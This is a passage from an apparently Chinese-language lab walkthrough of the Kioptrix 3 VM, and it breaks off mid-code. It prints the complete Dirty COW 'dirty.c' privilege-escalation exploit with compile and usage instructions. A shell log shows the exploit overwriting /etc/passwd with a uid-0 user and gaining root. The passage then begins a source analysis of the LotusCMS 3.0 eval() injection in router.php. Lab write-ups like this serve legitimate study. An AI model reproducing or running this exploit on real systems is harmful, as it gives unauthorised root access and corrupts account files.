class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="type">char</span> *username;</span><br><span class="line">   <span class="type">char</span> *hash;</span><br><span class="line">   <span class="type">int</span> user_id;</span><br><span class="line">   <span class="type">int</span> group_id;</span><br><span class="line">   <span class="type">char</span> *info;</span><br><span class="line">   <span class="type">char</span> *home_dir;</span><br><span class="line">   <span class="type">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_password_hash</span><span class="params">(<span class="type">char</span> *plaintext_pw)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">generate_passwd_line</span><span class="params">(<span class="keyword">struct</span> Userinfo u)</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="type">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="type">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">madviseThread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">copy_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *from, <span class="type">const</span> <span class="type">char</span> *to)</span> &#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="type">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;evait&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="type">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="type">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="type">unsigned</span> <span class="type">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="type">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with username %s and password %s.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE %s FROM %s !!!\n\n&quot;</span>,</span><br><span class="line">    filename, backup_filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经测利用 POC 可成功提权至 root 权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">www-data@Kioptrix3:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">www-data@Kioptrix3:/tmp$ <span class="built_in">ls</span> -al dirty</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 10939 Oct  1 20:19 dirty</span><br><span class="line">www-data@Kioptrix3:/tmp$ </span><br><span class="line">www-data@Kioptrix3:/tmp$ ./dirty 1234</span><br><span class="line">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br><span class="line">Please enter the new password: 1234</span><br><span class="line">Complete line:</span><br><span class="line">evait:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">mmap: b7fe0000</span><br><span class="line">madvise 0</span><br><span class="line"></span><br><span class="line">ptrace 0</span><br><span class="line">Done! Check /etc/passwd to see <span class="keyword">if</span> the new user was created</span><br><span class="line">You can <span class="built_in">log</span> <span class="keyword">in</span> with username evait and password 1234.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DON<span class="string">&#x27;T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Done! Check /etc/passwd to see if the new user was created</span></span><br><span class="line"><span class="string">You can log in with username evait and password 1234.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">DON&#x27;</span>T FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!</span><br><span class="line"></span><br><span class="line">www-data@Kioptrix3:/tmp$ <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">evait:fionu3giiS71.:0:0:pwned:/root:/bin/bash</span><br><span class="line">on:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">dhcp:x:101:102::/nonexistent:/bin/false</span><br><span class="line">syslog:x:102:103::/home/syslog:/bin/false</span><br><span class="line">klog:x:103:104::/home/klog:/bin/false</span><br><span class="line">mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false</span><br><span class="line">sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash</span><br><span class="line">dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash</span><br><span class="line">www-data@Kioptrix3:/tmp$ su evait</span><br><span class="line">Password: </span><br><span class="line">evait@Kioptrix3:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(evait) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">evait@Kioptrix3:/tmp<span class="comment"># cd /root</span></span><br><span class="line">evait@Kioptrix3:~<span class="comment"># </span></span><br><span class="line">evait@Kioptrix3:~<span class="comment"># ls -al</span></span><br><span class="line">total 52</span><br><span class="line">drwx------  5 evait root  4096 2011-04-17 08:59 .</span><br><span class="line">drwxr-xr-x 21 evait root  4096 2011-04-11 16:54 ..</span><br><span class="line">-rw-------  1 evait root     9 2011-04-18 11:49 .bash_history</span><br><span class="line">-rw-r--r--  1 evait root  2227 2007-10-20 07:51 .bashrc</span><br><span class="line">-rw-r--r--  1 evait root  1327 2011-04-16 08:13 Congrats.txt</span><br><span class="line">drwxr-xr-x 12 evait root 12288 2011-04-16 07:26 ht-2.0.18</span><br><span class="line">-rw-------  1 evait root   963 2011-04-12 19:33 .mysql_history</span><br><span class="line">-rw-------  1 evait root   228 2011-04-18 11:09 .nano_history</span><br><span class="line">-rw-r--r--  1 evait root   141 2007-10-20 07:51 .profile</span><br><span class="line">drwx------  2 evait root  4096 2011-04-13 10:06 .ssh</span><br><span class="line">drwxr-xr-x  3 evait root  4096 2011-04-15 23:30 .subversion</span><br><span class="line">evait@Kioptrix3:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<h2 id="复盘">3. 复盘</h2>
<h3 id="lotuscms-3.0-rce">3.1. LotusCMS 3.0 RCE</h3>
<p>相关源码分析</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * GPL v4 </span></span><br><span class="line"><span class="comment"> * LotusCMS 2010.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Written by Kevin Bluett</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//Start the session.</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Failsafe to install</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;install.php&quot;</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: install.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Load up the routing system</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;core/lib/router.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Route the page request to the specified system, eg. Page retrieval, administration or essentially anything.</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>跟进 router.php，观察对 $page 的处理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * GPL v4</span></span><br><span class="line"><span class="comment"> * LotusCMS 2010.</span></span><br><span class="line"><span class="comment"> * Written by Kevin Bluett</span></span><br><span class="line"><span class="comment"> * This Class routes any request from an external source into the LotusCMS systems.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Router</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * This routes any request from get variables into the LotusCMS system.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Router</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="comment">//Get page request (if any)</span></span><br><span class="line">                <span class="variable">$page</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getInputString</span>(<span class="string">&quot;page&quot;</span>, <span class="string">&quot;index&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Get plugin request (if any)</span></span><br><span class="line">                <span class="variable">$plugin</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getInputString</span>(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;Page&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//If there is a request for a plugin</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;core/plugs/&quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;Starter.php&quot;</span>))&#123;</span><br><span class="line">                        <span class="comment">//Include Page fetcher</span></span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;core/plugs/&quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;Starter.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//Fetch the page and get over loading cache etc...</span></span><br><span class="line">                        <span class="keyword">eval</span>(<span class="string">&quot;new &quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;Starter(&#x27;&quot;</span>.<span class="variable">$page</span>.<span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;data/modules/&quot;</span>.<span class="variable">$plugin</span>.<span class="string">&quot;/starter.dat&quot;</span>))&#123;</span><br><span class="line">                        <span class="comment">//Include Module Fetching System</span></span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;core/lib/ModuleLoader.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//Load Module</span></span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ModuleLoader</span>(<span class="variable">$plugin</span>, <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getInputString</span>(<span class="string">&quot;page&quot;</span>, <span class="literal">null</span>));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123; <span class="comment">//Otherwise load a page from the standard system.</span></span><br><span class="line">                        <span class="comment">//Include Page fetcher</span></span><br><span class="line">                        <span class="keyword">include</span>(<span class="string">&quot;core/plugs/PageStarter.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">//Fetch the page and get over loading cache etc...</span></span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">PageStarter</span>(<span class="variable">$page</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span 